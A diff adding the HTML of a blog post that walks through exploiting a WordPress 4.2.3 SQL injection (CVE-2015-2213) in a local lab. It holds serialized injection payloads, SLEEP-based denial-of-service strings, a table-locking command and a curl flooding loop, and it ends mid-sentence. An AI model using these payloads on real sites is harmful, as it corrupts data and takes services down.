@@ -1,0 +1,441 @@
+
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <title>Ethan's Tech Blog | WordPress 4.2 Exploit, SQL Injection Edition</title>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="description" content="While looking through my email I saw CVE-2015-2213 and decided to try to exploit it on my local machine to compromise a wordpress site. Script Kiddies don&#39;t try this at home! (Post for educational purposes only)" />
+    <meta name="author" content="Ethan Eldridge">
+    <meta name="keywords" content="wordpress,security,exploit,sql injection,4.2.3,compromise,denial of service,DoS"/>
+    <meta name="robots" content="index, follow"  />
+      <meta name="revisit-after" content="1 month" />
+      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">  
+      
+    
+	<link rel="shortcut icon" href="//static.ethanjoachimeldridge.info/favicon.ico" type="image/x-icon" />
+	<link rel="icon" href="//static.ethanjoachimeldridge.info/favicon.ico" type="image/ico">
+
+        
+    <!-- Facebook Open Graph Tags -->
+    <meta property="og:title" content="Ethan Eldridge | WordPress 4.2 Exploit, SQL Injection Edition" />
+    <meta property="og:type" content="article" />
+    <meta property="og:image" content="//static2.ethanjoachimeldridge.info/ethan.jpeg" />
+    <meta property="og:url" content="http://www.ethanjoachimeldridge.info/" />
+    
+    <meta property="og:description" content="While looking through my email I saw CVE-2015-2213 and decided to try to exploit it on my local machine to compromise a wordpress site. Script Kiddies don&#39;t try this at home! (Post for educational purposes only)" />
+    
+
+    <!-- Twitter Card Tags -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Ethan Eldridge | WordPress 4.2 Exploit, SQL Injection Edition" />
+    
+    <meta name="twitter:description" content="While looking through my email I saw CVE-2015-2213 and decided to try to exploit it on my local machine to compromise a wordpress site. Script Kiddies don&#39;t try this at home! (Post for educational purposes only)" />
+    
+    <meta name="twitter:image" content="//static2.ethanjoachimeldridge.info/ethan.jpeg" />
+    	<!-- Core CSS Scripts -->
+	<link rel='stylesheet' href='//css.ethanjoachimeldridge.info/style.css' />
+
+
+	
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-52103053-1', 'www.ethanjoachimeldridge.info');
+  ga('require', 'linkid', 'linkid.js');
+  ga('send', 'pageview');
+
+</script>
+
+  </head>
+  <body>
+    <header>
+      <h1>WordPress 4.2 Exploit, SQL Injection Edition</h1>
+    </header>
+
+
+    <div id="content">
+      <a href="/tech-blog">Back</a>
+      <h3>Let&#39;s SQL Inject WordPress! (v 4.2.3)</h3><p>If you&#39;re not subscribed to a security mailing list it means you often don&#39;t
+know when the site you run might be vulnerable. But even when you&#39;re on them
+sometimes you wonder how vulnerable your site actually is. After all, out of 
+all the sites out there, &quot;who would attack me?&quot; is a prevailing mindset. But no 
+matter what your mindset, it&#39;s good to take a few moments out of your day to 
+see how vulnerable your system is.</p>
+<p>So today I decided to see if I could use a security mailing list report to 
+backdoor a wordpress installation. First off, we need wordpress, so go to
+<a href="https://wordpress.org/download/release-archive/">the release archive</a> and download version 4.2.3. This version is affected 
+by a <a href="https://core.trac.wordpress.org/changeset/33556/branches/4.2/src/wp-includes/post.php?contextall=1">lack of sanitation here</a>. Secondly let&#39;s get setup on our local 
+machine.</p>
+<p><strong>Apache Virtual host to test</strong></p>
+<pre><code>&lt;VirtualHost *:80&gt;
+    Servername local.wordpress.sec
+    ErrorLog /tmp/error.log
+    DocumentRoot /path/to/downloaded/wordpress
+    &lt;Directory /path/to/downloaded/wordpress &gt;
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride All
+        Order allow,deny
+        allow from all
+    &lt;/Directory&gt;
+&lt;/VirtualHost&gt;
+</code></pre><p><strong>/etc/hosts file update</strong></p>
+<pre><code>127.0.0.1 local.wordpress.sec
+</code></pre><p><strong>MySQL database</strong></p>
+<pre><code>$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 3
+Server version: 5.6.16-log MySQL Community Server (GPL)
+
+Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.
+
+mysql&gt; create database hackedsite;
+Query OK, 1 row affected (0.03 sec)
+</code></pre><p>Once this is done, navigate to <a href="http://local.wordpress.sec">http://local.wordpress.sec</a> in your browser and 
+you should be greeted by the usual wordpress screen:</p>
+<p><img src="/images/tech-blog/hacked/1.jpg" alt="The Wordpress install page"></p>
+<p>Run through the instructions, setting up a wp-config.php file if neccesary, 
+and enter your site information:</p>
+<p><img src="/images/tech-blog/hacked/2.jpg" alt="The Wordpress setup page"></p>
+<p>Now that that&#39;s setup, we can begin utilizing our knowledge about <a href="https://bugzilla.redhat.com/show_bug.cgi?id=1250583">the bug CVE-2015-2213</a>
+to compromise the site. The bug occurs in the <code>wp_untrash_post_comments</code> function,
+which from its name and the documentation around it, restores comments that have 
+been trashed due to the related post being trashed. Here&#39;s the vulnerable code:</p>
+<pre><code>foreach ( $group_by_status as $status =&gt; $comments ) {
+    // Sanity check. This shouldn&#39;t happen.
+    if ( &#39;post-trashed&#39; == $status )
+        $status = &#39;0&#39;;
+    $comments_in = implode( &quot;&#39;, &#39;&quot;, $comments );
+    $wpdb-&gt;query( &quot;UPDATE $wpdb-&gt;comments SET comment_approved = &#39;$status&#39; WHERE comment_ID IN (&#39;&quot; . $comments_in . &quot;&#39;)&quot; );
+}
+</code></pre><p>To restore a comment we simply change it to be unapproved again and delete some 
+post meta information. The issue of course lies in the <code>implode</code> on the <code>$comments</code> 
+variable. Where does <code>$comments</code> come from? The <code>$group_by_status</code> variable, 
+which comes from:</p>
+<pre><code>// Restore each comment to its original status.
+$group_by_status = array();
+foreach ( $statuses as $comment_id =&gt; $comment_status )
+    $group_by_status[$comment_status][] = $comment_id;
+</code></pre><p>which comes from the <code>$statuses</code> variable. Which comes from:</p>
+<pre><code>$statuses = get_post_meta($post_id, &#39;_wp_trash_meta_comments_status&#39;, true);
+</code></pre><p>Which ultimately comes from the database&#39;s postmeta table. The issue is that 
+we expect numeric ID&#39;s, but the postmeta can hold anything due to WordPress&#39;s 
+<a href="https://codex.wordpress.org/Database_Description">long and skinny design</a>. So let&#39;s get to injecting. First, we post 
+a comment on the blog:</p>
+<p><img src="/images/tech-blog/hacked/3.jpg" alt="Leaving a comment on the blog"></p>
+<p>And later on an administrator deletes the post:</p>
+<p><img src="/images/tech-blog/hacked/4.jpg" alt="Deleting a post on the site"></p>
+<p>And we now see the vulnerable field in the database ready for the taking:</p>
+<pre><code>mysql&gt; select * from wp_postmeta;
++---------+---------+--------------------------------+--------------------------------+
+| meta_id | post_id | meta_key                       | meta_value                     |
++---------+---------+--------------------------------+--------------------------------+
+|       1 |       2 | _wp_page_template              | default                        |
+|       2 |       1 | _wp_trash_meta_status          | publish                        |
+|       3 |       1 | _wp_trash_meta_time            | 1440362401                     |
+|       4 |       1 | _wp_trash_meta_comments_status | a:2:{i:1;s:1:&quot;1&quot;;i:2;s:1:&quot;1&quot;;} |
++---------+---------+--------------------------------+--------------------------------+
+</code></pre><p>As you can tell, the <code>_wp_trash_meta_comments_status</code> field is a serialized PHP
+array. Now let&#39;s assume you&#39;ve compromised the website in some way and managed 
+to get database access. So assuming you&#39;re able to modify that meta value in 
+some way, we can cause an injection.</p>
+<p>Let&#39;s say we change the meta_value to deserialize to an array like this:</p>
+<pre><code>array(&quot;&#39;); SELECT (&#39;hi&quot; =&gt; 0);
+</code></pre><p>This is a simple <a href="https://en.wikipedia.org/wiki/SQL_injection">SQL Injection</a>, and when ran through the code will result in 
+a query going to the database like this: </p>
+<pre><code>UPDATE wp_comments SET comment_approved = 0 WHERE comment_ID IN (&#39;&#39;); SELECT (&#39;hi&#39;);
+</code></pre><p>Which if you run in your MySQL shell will result in a simple hi being returned. 
+So could this be used to backdoor or do something malicious? Simple:</p>
+<pre><code>array(&quot;&#39;); UPDATE wp_users set user_email = (&#39;myemail@example.com&quot; =&gt; &quot;1&quot;)
+</code></pre><p>Will result in the query to the database:</p>
+<pre><code>UPDATE wp_comments SET comment_approved = 1 WHERE comment_ID IN (&#39;&#39;); UPDATE wp_users set user_email = (&#39;myemail@example.com&#39;)
+</code></pre><p>And now every single user account&#39;s email is set to yours! Of course, you could 
+make this a bit less noticeable by targetting a single account. The obvious being 
+ID=1, the admin account that will likely exist on every wordpress site out there. 
+Plan drawn, let&#39;s see it in practice! First, serializing our attack array:</p>
+<pre><code>$ php -a 
+php &gt; $comments = array(&quot;&#39;); UPDATE wp_users set user_email = (&#39;1qdzqk+bzlrxxfbjpnvk@sharklasers.com&quot; =&gt; 1);
+php &gt; print serialize($comments);
+a:1:{s:75:&quot;&#39;); UPDATE wp_users set user_email = (&#39;1qdzqk+bzlrxxfbjpnvk@sharklasers.com&quot;;i:1;}
+</code></pre><p>And then using the database access you have, we can insert a backdoor:</p>
+<pre><code> UPDATE wp_postmeta SET meta_value = &quot;a:1:{s:75:\&quot;&#39;); UPDATE wp_users set user_email = (&#39;1qdzqk+bzlrxxfbjpnvk@sharklasers.com\&quot;;i:1;}&quot; WHERE meta_key = &#39;_wp_trash_meta_comments_status&#39; AND post_id = 1;
+</code></pre><p>To check if this works, let&#39;s examine the database before:</p>
+<pre><code>mysql&gt; update wp_users set user_email = &#39;&#39;;
+Query OK, 0 rows affected (0.05 sec)
+Rows matched: 1  Changed: 0  Warnings: 0
+
+mysql&gt; select * from wp_users;
++----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email | user_url | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$By9vOxgjlDv/ZVc3P6RCkm2ODy.dnG. | admin         |            |          | 2015-08-23 20:20:42 |                     |           0 | admin        |
++----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+
+1 row in set (0.00 sec)
+</code></pre><p>Then undelete the post:</p>
+<p><img src="/images/tech-blog/hacked/5.jpg" alt="Undeleting a post on the site"></p>
+<p>And nothing will happen! Why? Because by default WordPress use&#39;s mysqli, which 
+doesn&#39;t support multiple statements being executed at the same time. So can we 
+get around this? MySQL supports flags for executing multiple queries after all.</p>
+<pre><code>define(&#39;MYSQL_CLIENT_FLAGS&#39;, 65536);
+</code></pre><p>and now when we connect to MySQL we&#39;ll have the proper flags to have multiple 
+query support turned on. However, <a href="https://php.net/manual/en/function.mysql-query.php">mysql_query</a> doesn&#39;t support more than one 
+statement at a time. So you&#39;re still going to just make noise in the log:</p>
+<pre><code>WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;UPDATE wp_users set user_email = (&#39;1qdzqk+bzlrxxfbjpnvk@sharklasers.com&#39;)&#39; at line 1 for query UPDATE wp_comments SET comment_approved = &#39;1&#39; WHERE comment_ID IN (&#39;&#39;); UPDATE wp_users set user_email = (&#39;1qdzqk+bzlrxxfbjpnvk@sharklasers.com&#39;) made by wp_untrash_post, wp_untrash_post_comments, referer: http://local.wordpress.sec/wp-admin/edit.php?post_status=trash&amp;post_type=post
+</code></pre><p>If wordpress used <a href="https://secure.php.net/manual/en/mysqli.multi-query.php">multi-query</a> this would work. But since they don&#39;t support that 
+and probably won&#39;t in the future due to it&#39;s dangerous nature, it seems that the
+most that someone could do with this bug is make noise in the logfile. Also, since
+the injection attack requires access to the database to setup in the first place, 
+it&#39;s highly unlikely to run into it from an outside attacker. Plus, in my testing 
+it really requires some very specific information and events to happen:</p>
+<ol>
+<li>An admin or editor must make a post</li>
+<li>Someone must comment on that post</li>
+<li>An admin or editor must delete the post (not the comment, the post!)</li>
+<li>While the post is in the trash, the attacker must update the database as above</li>
+<li>The key in the attack array is the injected SQL, and the value is the status the comment will have set</li>
+<li>An admin or editor must restore the post from the trash to trigger the injection</li>
+</ol>
+<p>So all in all. A rather unlikely attack vector. But an interesting one to look at
+nonetheless. So, how <em>can</em> we use this as a serious attack? Well, besides filling 
+up a server&#39;s disk space with log errors, we could look at the ramifications of 
+screwing up the query itself. For example, right now this is the query that is 
+sent: </p>
+<pre><code>UPDATE wp_comments 
+    SET comment_approved = INJECTABLE 
+WHERE comment_ID IN (&#39;INJECTABLE&#39;)
+</code></pre><p>So what if we did this: </p>
+<pre><code>UPDATE wp_comments 
+    SET comment_approved = 1 
+WHERE comment_ID in (&#39;1&#39;) OR (&#39;1&#39; = &#39;1&#39;);
+</code></pre><p>This is within our power by simply serializing the following array and executing a query:</p>
+<pre><code>$comments = array(&quot;1&#39;) OR (&#39;1&#39;=&#39;1&quot; =&gt; 1);
+UPDATE wp_postmeta SET meta_value = &quot;a:1:{s:14:\&quot;1&#39;) OR (&#39;1&#39;=&#39;1\&quot;;i:1;}&quot; WHERE meta_key = &#39;_wp_trash_meta_comments_status&#39; 
+</code></pre><p>When ran, this would cause <em>every</em> comment on the <em>entire</em> site to be approved. If you 
+were to spam a website and create thousands of comments across the site, then execute 
+that query. You would increase the load on the server whenever rendering the wordpress
+commments. In the same way, if you instead had the value of the attack array be 0, 
+you would remove every comment on the entire site. Destroying all discussion and 
+causing massive work on the administrators part to seperate the spam from real content.</p>
+<p>This isn&#39;t the only way we can attempt to take down a site though. Here&#39;s a
+devil-ishly simple one:</p>
+<pre><code>$comments = array(&quot;1&#39;) OR SLEEP(&#39;9&quot; =&gt; 1);
+</code></pre><p>Which will cause the query to stay open.</p>
+<pre><code>mysql&gt; show processlist;
++-----+------+-----------+------------+---------+------+------------+---------------------------------------------------------------------------------------+
+| Id  | User | Host      | db         | Command | Time | State      | Info                                                                                  |
++-----+------+-----------+------------+---------+------+------------+---------------------------------------------------------------------------------------+
+| 831 | root | localhost | hackedsite | Query   |    0 | init       | show processlist                                                                      |
+| 841 | root | localhost | hackedsite | Query   |   39 | User sleep | UPDATE wp_comments SET comment_approved = &#39;1&#39; WHERE comment_ID IN (&#39;1&#39;) OR SLEEP(&#39;9&#39;) |
++-----+------+-----------+------------+---------+------+------------+---------------------------------------------------------------------------------------+
+</code></pre><p>If you did this enough times, you could cause starvation to the website and it could 
+run out of database threads to use. Causing a DoS attack. Take note of the code again:</p>
+<pre><code>foreach ( $group_by_status as $status =&gt; $comments ) {
+    // Sanity check. This shouldn&#39;t happen.
+    if ( &#39;post-trashed&#39; == $status )
+        $status = &#39;0&#39;;
+    $comments_in = implode( &quot;&#39;, &#39;&quot;, $comments );
+    $x = $wpdb-&gt;query( &quot;UPDATE $wpdb-&gt;comments SET comment_approved = &#39;$status&#39; WHERE comment_ID IN (&#39;&quot; . $comments_in . &quot;&#39;);&quot; );
+}
+</code></pre><p>We see that we&#39;re <em>looping</em> this update query for each status. On my local host,
+the max connection setting is set to 64. So we&#39;ll construct an array like so:</p>
+<pre><code>php &gt; $foo = array();
+php &gt; for($i = 0; $i &lt; 66; $i++) $foo[&quot;1&#39;) OR SLEEP(&#39;$i&quot;] = $i;
+php &gt; print_r($foo);
+Array
+(
+    [1&#39;) OR SLEEP(&#39;0] =&gt; 0
+    [1&#39;) OR SLEEP(&#39;1] =&gt; 1
+    [1&#39;) OR SLEEP(&#39;2] =&gt; 2
+    [1&#39;) OR SLEEP(&#39;3] =&gt; 3
+... etc
+
+print addslashes(serialize($foo));
+a:66:{s:15:\&quot;1\&#39;) OR SLEEP(\&#39;0\&quot;;i:0;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;1\&quot;;i:1;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;2\&quot;;i:2;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;3\&quot;;i:3;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;4\&quot;;i:4;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;5\&quot;;i:5;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;6\&quot;;i:6;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;7\&quot;;i:7;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;8\&quot;;i:8;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;9\&quot;;i:9;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;10\&quot;;i:10;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;11\&quot;;i:11;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;12\&quot;;i:12;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;13\&quot;;i:13;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;14\&quot;;i:14;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;15\&quot;;i:15;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;16\&quot;;i:16;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;17\&quot;;i:17;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;18\&quot;;i:18;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;19\&quot;;i:19;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;20\&quot;;i:20;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;21\&quot;;i:21;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;22\&quot;;i:22;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;23\&quot;;i:23;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;24\&quot;;i:24;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;25\&quot;;i:25;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;26\&quot;;i:26;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;27\&quot;;i:27;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;28\&quot;;i:28;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;29\&quot;;i:29;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;30\&quot;;i:30;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;31\&quot;;i:31;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;32\&quot;;i:32;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;33\&quot;;i:33;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;34\&quot;;i:34;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;35\&quot;;i:35;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;36\&quot;;i:36;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;37\&quot;;i:37;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;38\&quot;;i:38;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;39\&quot;;i:39;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;40\&quot;;i:40;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;41\&quot;;i:41;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;42\&quot;;i:42;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;43\&quot;;i:43;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;44\&quot;;i:44;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;45\&quot;;i:45;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;46\&quot;;i:46;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;47\&quot;;i:47;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;48\&quot;;i:48;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;49\&quot;;i:49;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;50\&quot;;i:50;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;51\&quot;;i:51;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;52\&quot;;i:52;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;53\&quot;;i:53;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;54\&quot;;i:54;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;55\&quot;;i:55;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;56\&quot;;i:56;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;57\&quot;;i:57;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;58\&quot;;i:58;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;59\&quot;;i:59;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;60\&quot;;i:60;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;61\&quot;;i:61;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;62\&quot;;i:62;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;63\&quot;;i:63;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;64\&quot;;i:64;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;65\&quot;;i:65;}
+</code></pre><p>And then insert it as usual when a post is trashed. </p>
+<pre><code>UPDATE wp_postmeta SET meta_value = &quot;a:66:{s:15:\&quot;1\&#39;) OR SLEEP(\&#39;0\&quot;;i:0;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;1\&quot;;i:1;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;2\&quot;;i:2;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;3\&quot;;i:3;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;4\&quot;;i:4;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;5\&quot;;i:5;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;6\&quot;;i:6;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;7\&quot;;i:7;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;8\&quot;;i:8;s:15:\&quot;1\&#39;) OR SLEEP(\&#39;9\&quot;;i:9;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;10\&quot;;i:10;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;11\&quot;;i:11;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;12\&quot;;i:12;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;13\&quot;;i:13;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;14\&quot;;i:14;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;15\&quot;;i:15;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;16\&quot;;i:16;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;17\&quot;;i:17;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;18\&quot;;i:18;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;19\&quot;;i:19;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;20\&quot;;i:20;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;21\&quot;;i:21;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;22\&quot;;i:22;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;23\&quot;;i:23;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;24\&quot;;i:24;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;25\&quot;;i:25;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;26\&quot;;i:26;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;27\&quot;;i:27;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;28\&quot;;i:28;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;29\&quot;;i:29;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;30\&quot;;i:30;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;31\&quot;;i:31;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;32\&quot;;i:32;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;33\&quot;;i:33;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;34\&quot;;i:34;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;35\&quot;;i:35;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;36\&quot;;i:36;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;37\&quot;;i:37;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;38\&quot;;i:38;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;39\&quot;;i:39;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;40\&quot;;i:40;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;41\&quot;;i:41;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;42\&quot;;i:42;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;43\&quot;;i:43;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;44\&quot;;i:44;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;45\&quot;;i:45;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;46\&quot;;i:46;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;47\&quot;;i:47;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;48\&quot;;i:48;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;49\&quot;;i:49;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;50\&quot;;i:50;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;51\&quot;;i:51;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;52\&quot;;i:52;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;53\&quot;;i:53;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;54\&quot;;i:54;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;55\&quot;;i:55;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;56\&quot;;i:56;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;57\&quot;;i:57;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;58\&quot;;i:58;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;59\&quot;;i:59;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;60\&quot;;i:60;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;61\&quot;;i:61;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;62\&quot;;i:62;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;63\&quot;;i:63;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;64\&quot;;i:64;s:16:\&quot;1\&#39;) OR SLEEP(\&#39;65\&quot;;i:65;}&quot; WHERE meta_key = &#39;_wp_trash_meta_comments_status&#39; 
+</code></pre><p>And you&#39;ll now always be eating up MySQL threads that could be used for something 
+more productive. With PHP, because the process running the updates is synchronous, 
+we only take up one thread though. If the code calling the database was looped 
+asynchronously, we&#39;d have a problem as we&#39;d use <em>all</em> the threads. The other 
+thing this could do is that if the <code>wp_comments</code> table was changed from using
+InnoDB to MyISAM we could stop anyone from commenting on the site due to <a href="https://dev.mysql.com/doc/refman/5.0/en/table-locking.html">table locking</a>. 
+Considering this hypothetical attacker can cause those UPDATE&#39;s to happen, they
+can probably do this:</p>
+<pre><code>mysql&gt; ALTER TABLE wp_comments ENGINE=MyISAM;
+</code></pre><p>Which, when we attempt to open up the web page results in the following:</p>
+<pre><code>mysql&gt; show processlist;
++-----+------+-----------+------------+---------+------+------------------------------+------------------------------------------------------------------------------------------------------+
+| Id  | User | Host      | db         | Command | Time | State                        | Info                                                                                                 |
++-----+------+-----------+------------+---------+------+------------------------------+------------------------------------------------------------------------------------------------------+
+| 868 | root | localhost | hackedsite | Query   |    0 | init                         | show processlist                                                                                     |
+| 870 | root | localhost | hackedsite | Query   |   37 | User sleep                   | UPDATE wp_comments SET comment_approved = &#39;9&#39; WHERE comment_ID IN (&#39;1&#39;) OR SLEEP(&#39;9&#39;)                |
+| 894 | root | localhost | hackedsite | Query   |    2 | Waiting for table level lock | SELECT * FROM wp_comments JOIN wp_posts ON wp_posts.ID = wp_comments.comment_post_ID WHERE ( comment |
++-----+------+-----------+------------+---------+------+------------------------------+------------------------------------------------------------------------------------------------------+
+3 rows in set (0.00 sec)
+</code></pre><p>Then all we have to do is open up 65+ connections:</p>
+<pre><code>$ for i in {0..65}
+&gt; do
+&gt; curl http://local.wordpress.sec/index.php/2015/08/23/hello-world/ &amp;
+&gt; done
+</code></pre><p>And tada! DoS:</p>
+<p><img src="/images/tech-blog/hacked/6.jpg" alt="A Successful Denial Of Service Attack">
+<img src="/images/tech-blog/hacked/7.jpg" alt="A Successful Denial Of Service Attack"></p>
+<p><code>SLEEP</code>ing a thread will occupy it for a long while, until the timeout for the 
+database. So if you wanted this to last until the database was restarted you 
+would want to cause an infinite loop with the update. But how would we do this?
+Easy! Like this:</p>
+<pre><code>UPDATE wp_comments 
+    SET comment_approved = &#39;1&#39;, comment_ID = comment_ID + &#39;1&#39; 
+WHERE comment_ID IN (&#39;&#39;) OR (comment_ID &gt;= 0 OR &#39;1&#39;=&#39;1&#39;);
+</code></pre><p>This causes an infinite loop because the index used to solve the <code>WHERE</code> 
+part of the update is effected by the update itself. And so once the update 
+takes place, the updated row will be sorted to another place in the index, 
+where it will be updated again. Again, injecting this is easy:</p>
+<pre><code>$comments = array(&quot;&#39;) OR (comment_ID &gt;= 0 OR &#39;1&#39;=&#39;1&quot; =&gt; &quot;1&#39;, comment_ID = comment_ID + &#39;1&quot;)
+UPDATE wp_postmeta SET meta_value = &quot;a:1:{s:32:\&quot;\&#39;) OR (comment_ID &gt;= 0 OR \&#39;1\&#39;=\&#39;1\&quot;;s:32:\&quot;1\&#39;, comment_ID = comment_ID + \&#39;1\&quot;;}&quot; WHERE meta_key = &#39;_wp_trash_meta_comments_status&#39;;
+</code></pre><p>But luckily for the system, this fails due to primary key errors, and we can&#39;t 
